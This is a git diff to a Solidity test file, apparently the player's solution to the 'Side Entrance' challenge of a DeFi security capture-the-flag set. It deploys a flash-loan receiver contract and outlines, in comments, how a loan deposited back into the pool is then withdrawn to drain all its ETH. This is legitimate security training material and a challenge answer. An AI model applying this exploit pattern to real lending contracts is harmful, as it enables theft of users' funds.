@@ -4,6 +4,7 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
+import {FlashLoanEtherReceiver} from "../../src/side-entrance/solution/FlashLoanEtherReceiver.sol";
 
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -14,6 +15,7 @@ contract SideEntranceChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
 
     SideEntranceLenderPool pool;
+    FlashLoanEtherReceiver receiver;
 
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
@@ -45,7 +47,15 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        // Deploy our flash loan receiver
+        receiver = new FlashLoanEtherReceiver(address(pool), recovery);
+
+        // Recover all the funds:
+        //  1. Request a flash loan for all the ETH available
+        //  2. Deposit all the ETH back to the contract by calling the `deposit` function inside our callback
+        //  3. Withdraw all the ETH
+        //  4. Send all the ETH to the recovery address
+        receiver.recoverFunds();
     }
 
     /**
